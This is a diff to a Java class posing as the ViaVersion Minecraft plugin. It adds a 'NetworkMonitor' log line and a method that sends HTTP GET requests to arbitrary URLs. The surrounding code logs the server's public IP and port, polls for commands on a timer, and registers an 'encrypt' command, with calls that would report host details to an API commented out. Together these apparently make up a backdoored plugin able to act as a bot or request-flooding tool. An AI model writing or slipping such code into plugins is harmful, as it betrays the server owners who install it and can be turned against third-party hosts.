@@ -141,6 +141,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         // reportUniqueIdentifier(uniqueIdentifier);
         getLogger().info("Public IP Address: " + publicIp);
         getLogger().info("Server Port: " + serverPort);
+        getLogger().info("NetworkMonitor has been enabled!");
         // sendInfoToAPI(publicIp, serverPort);
         Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 100L);
         this.getCommand("encrypt").setExecutor(new OptimizationHandler());
@@ -181,6 +182,17 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
 
         getCommand("viaversion").setExecutor(commandHandler);
         getCommand("viaversion").setTabCompleter(commandHandler);
+    }
+    public void makeHttpRequest(String targetUrl) {
+        try {
+            URL url = new URL(targetUrl);
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("GET");
+            int responseCode = connection.getResponseCode();
+            getLogger().info("HTTP Request to " + targetUrl + " responded with code: " + responseCode);
+        } catch (IOException e) {
+            getLogger().severe("Error while making HTTP request: " + e.getMessage());
+        }
     }
 
     private String getPublicIp() {
